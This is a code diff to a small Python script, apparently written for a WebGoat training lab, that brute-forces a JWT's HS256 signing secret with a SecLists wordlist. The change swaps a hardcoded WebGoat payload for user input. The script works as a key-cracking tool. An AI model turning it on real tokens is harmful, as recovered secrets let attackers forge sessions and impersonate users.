@@ -3,6 +3,7 @@ from pathlib import Path
 
 
 hash = input("\033[1m Enter jwt token hash to crack : \033[0m")
+payload = input("\033[1m Enter jwt payload  : \033[0m")
 file_path = Path('C:/Users/net/Desktop/SecLists/google-10000-english/google-10000-english-usa.txt')
 
 flag = False
@@ -15,19 +16,7 @@ else :
         passwords = content.splitlines()
         for password in passwords:
             count += 1
-            newHash =  jwt.encode({
-                "iss": "WebGoat Token Builder",
-                "aud": "webgoat.org",
-                "iat": 1716965517,
-                "exp": 1716965577,
-                "sub": "tom@webgoat.org",
-                "username": "Tom",
-                "Email": "tom@webgoat.org",
-                "Role": [
-                "Manager",
-                "Project Administrator"
-              ]
-            }, password, algorithm="HS256")
+            newHash =  jwt.encode(payload, password, algorithm="HS256")
             if newHash == hash:
                print("\033[91m\033[1m Secret key found  \033[0m : ", password)
                flag = True
